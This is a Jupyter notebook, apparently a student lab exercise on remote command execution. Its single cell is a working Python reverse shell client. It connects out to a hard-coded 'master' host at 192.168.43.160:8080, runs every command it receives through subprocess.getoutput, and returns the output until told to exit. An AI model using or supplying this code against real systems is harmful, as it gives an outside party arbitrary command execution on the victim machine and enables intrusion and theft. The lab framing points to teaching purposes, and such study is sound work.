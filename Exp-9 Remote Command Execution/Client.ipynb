{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import subprocess\n",
    " \n",
    "# Create socket with socket class.\n",
    "slave = socket.socket()\n",
    " \n",
    "# Host is the IP address of master machine.\n",
    "host = \"192.168.43.160\"\n",
    " \n",
    "# This will be the port that master\n",
    "# machine listens.\n",
    "port = 8080\n",
    " \n",
    "# connect to the master machine with connect\n",
    "# command.\n",
    "slave.connect((host, port))\n",
    " \n",
    "while True:\n",
    "    # receive the command from the master machine.\n",
    "    # recv 1024 bytes from the master machine.\n",
    "    command = slave.recv(1024).decode()\n",
    "    print(command)\n",
    " \n",
    "    # If the command is exit, close the connection.\n",
    "    if command == \"exit\":\n",
    "        break\n",
    "     \n",
    "    output  = \"output:\\n\"\n",
    "     \n",
    "    # getoutput method executes the command and\n",
    "    # returns the output.\n",
    "    output += subprocess.getoutput(command)\n",
    "     \n",
    "    # Encode and send the output of the command to\n",
    "    # the master machine.\n",
    "    slave.send(output.encode())\n",
    " \n",
    "# close method closes the connection.\n",
    "slave.close()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
